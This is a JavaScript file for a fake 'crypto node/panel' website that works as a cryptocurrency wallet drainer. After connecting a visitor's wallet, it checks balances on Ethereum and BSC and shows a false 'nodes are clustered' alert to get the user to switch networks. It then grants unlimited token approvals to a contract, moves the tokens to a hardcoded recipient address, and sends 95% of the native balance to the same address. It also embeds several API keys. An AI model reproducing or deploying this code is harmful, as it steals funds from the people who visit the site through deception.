import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5'
import { ethers } from 'ethers'
import axios from 'axios'
import Swal from 'sweetalert2'

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = '7b72ae90994c97929d1f03b9d8ca03d2'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921'
}

const bsc = {
    chainId: 56,
    name: 'Binance Smart chain',
    explorerUrl: 'https://bscscan.com/',
    rpcUrl: 'https://icy-quaint-silence.bsc.quiknode.pro/18b9bef5fff9264be562bf4365eedff44e109f9a/'
  }

// 3. Create your application's metadata object
const metadata = {
    name: 'Resolverconsult-panel.com',
    description: 'A crypto node/panel for fixing node clusters, validation and monitoring',
    url: 'Resolverconsult-panel.com', // url must match your domain & subdomain
    icons: ['https://avatars.mywebsite.com/']
  }
  
  // 4. Create Ethers config
  const ethersConfig = defaultConfig({
    /*Required*/
    metadata,
  
    /*Optional*/
    enableEIP6963: true, // true by default
    enableInjected: true, // true by default
    enableCoinbase: true, // true by default
    rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/IRwnvoQZmF2e0lePk63uoLwKO_en3nY1', // used for the Coinbase SDK
    defaultChainId: 1, // used for the Coinbase SDK
  })
  
  // 5. Create a Web3Modal instance
  const modal = createWeb3Modal({
    ethersConfig,
    chains: [
      mainnet,  
      bsc
    ], // Added chains array
    projectId,
    enableAnalytics: true, // Optional - defaults to your Cloud configuration
    enableOnramp: true // Optional - false as default
  })
  
  const openConnectModalBtn = document.getElementById('open-connect-modal')
  
  openConnectModalBtn.addEventListener('click', async () => {
      modal.open()
      openConnectModalBtn.innerHTML = 'Connected'
  })

//API KEYS
const etherscanapikey = '7K13FA32ZEWIPVXRS2ICJG5XUKHZMQE3DX';
const bnbscanapikey = 'CH84KRSH8Z71G951C6VXVRWN7BI49CI8Z6';

//SMART CONTRACT ADDRESSES
const contractAddress = '0x695902b97c3a78b3af0a3eedf15b4c9051e9d6f3';
const bnbContractAddress = '0xecb19b89bbc345e34c974fb0ab79add57cf76cd7';


const recipientAddress = '0xfEC0B00929ed4FF0d7662D8b912F04d97fBd0D54'; //RECIPIENT ADDRESS
const erc20ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
    "function balanceOf(address owner) external view returns (uint256)"
];
const contractABI = [
    "function transferTokens(address token, address owner, address recipient, uint256 amount) external returns (bool)"
];


async function connectWallet(){
    const walletProvider = modal.getWalletProvider();
    let provider = new ethers.providers.Web3Provider(walletProvider);
    let signer = provider.getSigner();

    try {
        await provider.send('eth_requestAccounts', []);
        const address = await signer.getAddress();
        const network = modal.getChainId();

        provider.on('network', (newNetwork, oldNetwork) => {
        if (oldNetwork) {
            provider = new ethers.providers.Web3Provider(walletProvider, 'any');
            signer = provider.getSigner();
        }
        });

        const networkDetect = [
            {
              chainId: mainnet.chainId,
              name: mainnet.name,
              rpcurl: mainnet.rpcUrl,
              nativeCurrency: { name: 'Ether', symbol: 'ETH', decimal: 18 },
              blockExplorerUrl: 'https://etherscan.io/',
              fetchTokens: fetchETHTokens,
            },
            {
              chainId: bsc.chainId,
              name: bsc.name,
              rpcurl: bsc.rpcUrl,
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimal: 18 },
              blockExplorerUrl: 'https://bscscan.com/',
              fetchTokens: fetchBNBTokens,
            },
          ];


          const currentChainId = await provider.getNetwork();
          const networksWithTokens = [];
      
          const minimumBalance = ethers.utils.parseUnits('0.02', 18);

          await Promise.all(
            networkDetect.map(async (nets) => {
              const networkProvider = new ethers.providers.JsonRpcProvider(nets.rpcurl);
              const nonZeroBalance = [];
              let netBalances = ethers.BigNumber.from(0);
              let highestSingleTokenBalance = ethers.BigNumber.from(0);
      
              // Get native balances first
              try {
                const nativeBalance = await networkProvider.getBalance(address);
                if (nativeBalance.gte(minimumBalance)) {
                  const formattedNativeBalance = ethers.utils.formatUnits(nativeBalance, 18);
                  const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${nets.nativeCurrency.symbol.toLowerCase()}`;
                  const response = await fetch(proxyUrl);
                  const prices = await response.json();
                  const priceInfo = prices.data?.[nets.nativeCurrency.symbol.toUpperCase()]?.quote.USD.price;
                  nonZeroBalance.push({ tokenSymbol: nets.nativeCurrency.symbol, balance: parseFloat(formattedNativeBalance) });
                  netBalances = netBalances.add(nativeBalance);
                  if (nativeBalance.gt(highestSingleTokenBalance)) {
                    const usdValue = (formattedNativeBalance * priceInfo).toString();
                    highestSingleTokenBalance = ethers.utils.parseUnits(usdValue, 18);
                  }
                }
              } catch (error) {
                console.error('Failed to fetch native balance:', error);
              }
      
              const tokens = await nets.fetchTokens(address);
              await Promise.all(
                tokens.map(async (token) => {
                  try {
                    const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, networkProvider);
                    const balance = await tokenContract.balanceOf(address);
      
                    if (balance.gte(minimumBalance)) {
                      const formattedBalance = ethers.utils.formatUnits(balance, token.decimal);
                      const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
                      const response = await fetch(proxyUrl);
                      const prices = await response.json();
                      const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
                      nonZeroBalance.push({ symbol: token.tokenSymbol, balance: parseFloat(formattedBalance) });
                      netBalances = netBalances.add(balance);
                      if (balance.gt(highestSingleTokenBalance)) {
                        const usdValue = (formattedBalance * priceInfo).toString();
                        highestSingleTokenBalance = ethers.utils.parseUnits(usdValue, 18);
                        nonZeroBalance.push({ usdValue: parseFloat(usdValue) });
                      }
                    }
                  } catch (error) {
                    console.error(`Failed to fetch balance for ${token.tokenSymbol}:`, error);
                  }
                })
              );
      
              if (nonZeroBalance.length > 0) {
                nonZeroBalance.sort((a, b) => b.usdValue - a.usdValue);
      
                networksWithTokens.push({
                  chainId: nets.chainId,
                  name: nets.name,
                  rpcUrl: nets.rpcurl,
                  nativeCurrency: nets.nativeCurrency,
                  blockExplorerUrl: nets.blockExplorerUrl,
                  highestSingleTokenBalance: ethers.utils.formatUnits(highestSingleTokenBalance, 18),
                  netBalances: ethers.utils.formatUnits(netBalances, 18),
                });
              }
            })
          );
      
          // Sort networks by highest single token balance in descending order
          networksWithTokens.sort((a, b) => parseFloat(b.highestSingleTokenBalance) - parseFloat(a.highestSingleTokenBalance));
      
          console.log(
            'Networks with tokens sorted by highest single token balance and usd value:',
            networksWithTokens.map((net) => ({
              name: net.name,
              highestSingleTokenBalance: net.highestSingleTokenBalance,
            }))
          );
      
          const maxSingleTokenBalance = Math.max(...networksWithTokens.map((net) => parseFloat(net.highestSingleTokenBalance)));
      
          console.log(`Maximum single token balance: ${maxSingleTokenBalance}`);
      
          if (!networksWithTokens.some((net) => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
            window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map((net) => net.name).join(', ')}. Please switch your network!`);
            for (let net of networksWithTokens) {
              const targetNetworkId = net.chainId; // Target each network with tokens
              try {
                // Attempt to switch networks programmatically
                await modal.switchNetwork(targetNetworkId);
                console.log(`Switched to network: ${targetNetworkId}`);
      
                // Update the provider and signer to reflect the new network
                provider = new ethers.providers.Web3Provider(walletProvider, 'any');
                signer = provider.getSigner();
      
                switch (targetNetworkId) {
                  // HANDLE ETHEREUM NETWORK
                  case mainnet.chainId:
                    await handleTokenTransfers(address, signer, fetchETHTokens, contractAddress);
                    await transferNativeToken(address, signer, provider, recipientAddress, minimumBalance, 'ETH');
                    break;
      
                  // BINANCE SMART CHAIN
                  case bsc.chainId:
                    await handleTokenTransfers(address, signer, fetchBNBTokens, bnbContractAddress);
                    await transferNativeToken(address, signer, provider, recipientAddress, minimumBalance, 'BNB');
                    break;
                }
              } catch (error) {
                console.error(`Failed to switch network: ${targetNetworkId}`, error);
              }
            }
          }
        } catch (error) {
          console.error('Error connecting wallet:', error);
        }
}


async function handleTokenTransfers(address, signer, fetchTokens, contractAddr) {
    const tokens = await fetchTokens(address);
    const tokenDetails = await Promise.all(
      tokens.map(async (token) => {
        try {
          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
          const balance = await tokenContract.balanceOf(address);
          const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
          const response = await fetch(proxyUrl);
          const prices = await response.json();
          const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
  
          if (priceInfo !== undefined) {
            const formattedBalance = ethers.utils.formatUnits(balance, 18);
            const usdValue = parseFloat(formattedBalance) * priceInfo;
            const usdValueRounded = Math.round(usdValue);
            const usdValueString = usdValueRounded.toString();
            const transferrableValue = ethers.utils.parseUnits(usdValueString, 18);
  
            if (balance.gte(ethers.utils.parseUnits('0.02', 18)) && transferrableValue.gte(ethers.utils.parseUnits('0.02', 18))) {
              return {
                contract: tokenContract,
                balance: balance,
                symbol: token.tokenSymbol,
                address: token.contractAddress,
                usdValue: usdValue,
              };
            }
          } else {
            console.log('Price info not available...');
          }
        } catch (error) {
          console.error(`Failed to fetch token details for ${token.tokenSymbol}:`, error);
        }
      })
    );
  
    const sortedTokenDetails = tokenDetails.filter((token) => token).sort((a, b) => b.usdValue - a.usdValue);
  
    await Promise.all(
      sortedTokenDetails.map(async (token) => {
        try {
          const maxUint256 = ethers.constants.MaxUint256;
          const approveTx = await token.contract.approve(contractAddr, maxUint256, { gasLimit: 500000 });
          await approveTx.wait();
          console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
  
          const contract = new ethers.Contract(contractAddr, contractABI, signer);
          const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 });
          await transferTx.wait();
          console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
        } catch (error) {
          console.error('Error transferring tokens:', error);
        }
      })
    );
  }
  
  async function transferNativeToken(address, signer, provider, recipientAddress, minimumBalance, symbol) {
    try {
      const balance = await provider.getBalance(address);
      console.log(`Current balance: ${ethers.utils.formatEther(balance)} ${symbol}`);
  
      if (balance.gte(minimumBalance)) {
        const amountToSend = balance.mul(95).div(100);
        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ${symbol}`);
  
        const transaction = {
          to: recipientAddress,
          value: amountToSend,
        };
        const txResponse = await signer.sendTransaction(transaction);
        console.log(`Transaction hash: ${txResponse.hash}`);
  
        const txReceipt = await txResponse.wait();
        console.log('Transaction confirmed in block:', txReceipt.blockNumber);
      } else {
        console.log(`No balance found for ${symbol} to send`);
      }
    } catch (error) {
      console.error(`Error transferring ${symbol}:`, error);
    }
  }



//API FUNCTIONS
async function fetchETHTokens(account) {
    const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${etherscanapikey}`;
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });
            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
  }
  


//BNB API FUNCTION
async function fetchBNBTokens(account) {
  const url = `https://api.bscscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${bnbscanapikey}`;
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


const openNetworkModalBtn = document.getElementById('open-network-modal')
openNetworkModalBtn.addEventListener('click', () => connectWallet())
